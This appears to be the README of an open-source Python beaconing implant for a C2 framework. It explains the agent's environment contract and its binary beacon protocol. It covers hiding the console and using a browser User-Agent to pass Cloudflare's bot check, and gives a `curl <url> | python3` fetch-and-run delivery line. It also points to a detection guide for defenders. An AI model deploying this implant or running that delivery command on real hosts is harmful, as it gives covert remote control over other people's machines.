# python-agent

The cross-platform Python HTTP-beacon agent for the [C2](https://github.com/mrzaxaryan/C2)
platform — a single static `.py` file ([`src/python-agent.py`](src/python-agent.py)) that turns
its host process (the system Python) into an implant with no payload download and no compilation
step. It is the interpreter-native sibling of the JScript/PowerShell agents: same identity
model, same wire contract, spoken from any OS that ships Python.

It targets **Python 2.6 through 3.x** (stdlib only): the `urllib`/`urllib2` import shim, no
f-strings, no `nonlocal` (loop state lives in a `box` dict so nested helpers can rebind it on
both majors), and `bytearray` as the one byte type whose indexing behaves identically on 2 and
3. Windows, Linux, macOS, and Android/Termux hosts are all in scope — identity detection
branches per platform (`MachineGuid` via `reg query` pinned to the x86 view on Windows,
`/etc/machine-id` on Linux, `IOPlatformUUID` on macOS).

## Environment contract

The agent carries **no baked configuration**. Its single input is the process environment:

| Variable | Meaning |
|---|---|
| `H_URL` | The beacon endpoint — the HTTP relay root (`https://<relay>/`). Empty or unset ⇒ the agent returns `'fail'` (silently — pre-identity, log shipping is inert). |

Everything else (identity, machine architecture, OS version) is derived on the target at
runtime. `X-Client-Features` always ships `0000000000000000` — this breed has no upgrade arm
(`0x0B` deserialization is CLR-hosted, `0x0C` native injection belongs to the C# agent), so the
mask honestly reports an implant that registers, beacons, and exits; Exit is a core command and
needs no bit. `X-Client-Id` is `4` (breed: Python Agent).

## Host contract

`runAgent()` is designed to be **nested inside a host master** — a wrapper script that owns all
window and process manipulation. The agent itself performs none. Concretely:

- It defines exactly one top-level symbol: `def runAgent()`. Everything else is nested inside;
  helpers read the enclosing scope and write loop state through the `box` dict (Python 2 has no
  `nonlocal`).
- It **returns** instead of exiting: `'exit'` (operator sent Exit) or `'fail'` (endpoint unset,
  non-200 answer, or POST exception). The host decides what to do — typically let the process
  end on either value.
- Logging is relay-ship only (`X-Log-Only: 1` frames) — no local echo (`print` appears
  nowhere), never fatal.
- It reads `H_URL` from the process environment, so the host must set it
  (`os.environ['H_URL'] = ...`) **before** calling `runAgent()`.

The C2 Python Loader panel is the reference host: it emits the H_URL assignment, a best-effort
hide-console mini (win32-guarded `ctypes` `ShowWindow(0)` — a no-op elsewhere), the agent text
verbatim, then `runAgent()` — and serves the result through file hosting as
`curl <url> | python3` (or the `wget`/`python -c` variants).

## Beacon contract (v3)

Spoken against the HTTP relay (see the `http-relay` worker — the beacon leg answers at its root):

- **POST** to `H_URL` with the full identity header set (API 1) on every request, plus a
  browser `User-Agent` (NOT optional: Cloudflare's Browser Integrity Check 403s urllib's
  default `Python-urllib/x` signature — error 1010 — before the request ever reaches the
  worker); body =
  RAW binary frames (`[u32le length][bytes]`), one frame per owed reply, empty body when none
  is pending. Python's native `bytes` builds/parses these with `struct` — no JScript ADODB
  bridge needed.
- **Every successful answer is `200`**: body = frames of queued commands
  (`[opcode][corrId u32le][payload]`), empty body = nothing queued. There is no 204; any
  non-200 is fatal.
- The relay holds each request server-side for a random 20–30 s; the agent's `urlopen` timeout
  is 45 s (keep it > max-hold + 10 s if the relay window ever grows; log ships use 15 s). On an
  empty body the agent re-POSTs immediately — the hold is the agent's only idle sleep.
- **Failure is fatal**: a non-200 status (raised as `HTTPError`) or a POST exception returns
  `'fail'` — no retry loop. Presence is re-established by re-delivery, not by the process
  burning CPU against a dead relay.
- TLS verification stays at the interpreter's default — no unverified-context global (the old
  loader's disable was for unsigned GitHub-Release payloads this agent never fetches).

### Commands

| Opcode | Command | Behavior |
|---|---|---|
| `0x0A` | Exit | Sets the exit flag; the loop unwinds and `runAgent()` returns `'exit'`. |
| other | unknown | Replies u32 `2`. |

Every reply echoes the command's correlation id after its status: `[status:u32le][corrId:u32le]`;
id 0 = unmatched.

## Local verification

```
python -c "exec(open('src/python-agent.py').read()); print(runAgent())"
```

Expected: with `H_URL` unset, a clean `fail` line and nothing else; against a live relay
(`wrangler dev` in the `http-relay` repo), the beacon appears with its parsed identity
identity and answers queued commands. A loopback harness (POST capture + scripted framed
answers) is how the reply framing, unknown-opcode status-2 path, and Exit were verified during
development — including the ARM64 Windows identity quirk (no Wow6432Node `MachineGuid`, so the
default-view fallback fires).

## For defenders

[DEFENSE.md](DEFENSE.md) is the detection guide for this agent: network and host indicators
derived from the source (with line references), detection opportunities, and a MITRE ATT&CK
mapping. Detection engineering against Python implants benefits from the interpreter's own
telemetry surface (script content inspection, subprocess auditing, `urllib` egress baselines) —
details there.

## License

MIT — see [LICENSE](LICENSE). Usage is governed by [RESPONSIBLE_USE.md](RESPONSIBLE_USE.md) and
[SECURITY.md](SECURITY.md).
